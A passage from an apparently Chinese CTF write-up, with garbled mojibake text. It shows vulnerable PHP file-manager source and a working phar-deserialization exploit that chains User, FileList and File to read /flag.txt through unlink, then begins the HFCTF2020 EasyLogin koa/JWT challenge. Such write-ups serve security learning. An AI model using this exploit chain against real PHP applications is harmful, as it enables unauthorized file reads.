</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;class.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">,</span> <span class="nx">getcwd</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&#34;:/etc:/tmp&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">40</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;flag&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-type: application/octet-stream&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-Disposition: attachment; filename=&#34;</span> <span class="o">.</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File not exist&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>delete.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;class.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sandbox&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">40</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">detele</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-type: application/json&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;success&#34;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span> <span class="s2">&#34;error&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Content-type: application/json&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;success&#34;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span> <span class="s2">&#34;error&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;File not exist&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ„é“¾å­</p>
<p>å› ä¸º<code>File</code>ç±»ä¸‹é¢æœ‰<code>file_get_contents</code>å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œè°ƒç”¨äº†closeå‡½æ•°</p>
<p>æŸ¥æ‰¾åˆ°<code>User</code>ç±»é‡Œé¢æœ‰ï¼Œä½†æ˜¯è¿™æ ·è°ƒç”¨ä¼šè§¦å‘<code>__call</code>æ–¹æ³•ï¼Œæˆ‘ä»¬ç”¨<code>Filelist</code>ç±»é‡Œé¢çš„<code>__call</code>å‘ç°fileså˜é‡ä¼šæ‰§è¡Œå‡½æ•°æŠŠç»“æœä»¥æ•°ç»„å½¢å¼è¿”å›ï¼Œæˆ‘ä»¬ç›´æ¥ä»¤å®ƒä¸º<code>File</code>ç±»ï¼Œå°†flagè¿”å›ç„¶åè°ƒç”¨closeå‡½æ•°å›æ˜¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">User -&gt;Filelist call -&gt;File close()
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileList</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$files</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="k">new</span> <span class="nx">File</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">close</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">=</span><span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">=</span><span class="k">new</span> <span class="nx">FileList</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//ç”Ÿæˆpharæ—¶ï¼Œæ–‡ä»¶çš„åç¼€åå¿…é¡»ä¸ºphar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">//è®¾ç½®stub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;GIF89a&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifestï¼Œè¿™ä¸ªæ˜¯åˆ©ç”¨çš„é‡ç‚¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥ä¸å­˜åœ¨ï¼Œä½†è¿™å¥è¯­å¥ä¸èƒ½å°‘
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ç­¾åè‡ªåŠ¨è®¡ç®—
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç”Ÿæˆpharåï¼Œæ‰¾è§¦å‘ååºåˆ—åŒ–åˆ©ç”¨ç‚¹</p>
<p>downloadå’Œdeleteé‡Œé¢ç”±äºdownloadè¿‡æ»¤flag</p>
<p>æˆ‘ä»¬åœ¨delete.phpé‡Œé¢æ‰¾åˆ°deleteå‡½æ•°ï¼Œå›åˆ°class.phpå‘ç°è°ƒç”¨unlinkå‡½æ•°åˆšå¥½å¯ä»¥è§¦å‘ååºåˆ—åŒ–</p>
<h2 id="hfctf2020easylogin">[HFCTF2020]EasyLogin
</h2><p>ä¸Šæ¥æŸ¥çœ‹æºç </p>
<p>app.js</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Â æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="cm"> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">login</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#username&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#password&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">&#34;token&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/api/login&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">,</span> <span class="nx">authorization</span><span class="o">:</span><span class="nx">token</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="p">{</span><span class="nx">status</span><span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;/home&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">fail</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">xhr</span><span class="p">,</span> <span class="nx">textStatus</span><span class="p">,</span> <span class="nx">errorThrown</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseJSON</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">register</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#username&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#password&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/api/register&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="p">{</span> <span class="nx">token</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="nx">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;/login&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">fail</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">xhr</span><span class="p">,</span> <span class="nx">textStatus</span><span class="p">,</span> <span class="nx">errorThrown</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseJSON</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">logout</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/api/logout&#39;</span><span class="p">).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span><span class="nx">status</span><span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;/login&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getflag</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/api/flag&#39;</span><span class="p">).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span><span class="nx">flag</span><span class="p">}</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#username&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}).</span><span class="nx">fail</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">xhr</span><span class="p">,</span> <span class="nx">textStatus</span><span class="p">,</span> <span class="nx">errorThrown</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseJSON</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢è¯´ç”¨koaæ¡†æ¶å†™çš„</p>
<h3 id="koaæ¡†æ¶åŸºæœ¬ç›®å½•">koaæ¡†æ¶åŸºæœ¬ç›®å½•
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">koaæ¡†æ¶å¸¸ç”¨ç›®å½•ï¼Œæ–‡ä»¶
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app/controllers é¡¹ç›®æ§åˆ¶å™¨å­˜æ”¾ç›®å½•ï¼šæ¥æ”¶è¯·æ±‚ï¼Œå¤„ç†é€»è¾‘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app/dbhelper æ•°æ®åº“CRUDæ“ä½œçš„å°è£…
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app/models å¯¹åº”æ•°æ®åº“è¡¨è¡¨ç»“æ„
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">config/router.js é¡¹ç›®è·¯ç”±
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">node_modules app.js é¡¹ç›®å…¥å£
</span></span></code></pre></td></tr></table>
</div>
</div><p>è®¿é—®controllersä¸‹çš„api.jså¾—åˆ°æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;jsonwebtoken&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">APIError</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../rest&#39;</span><span class="p">).</span><span class="nx">APIError</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;POST /api/register&#39;</span><span class="o">:</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
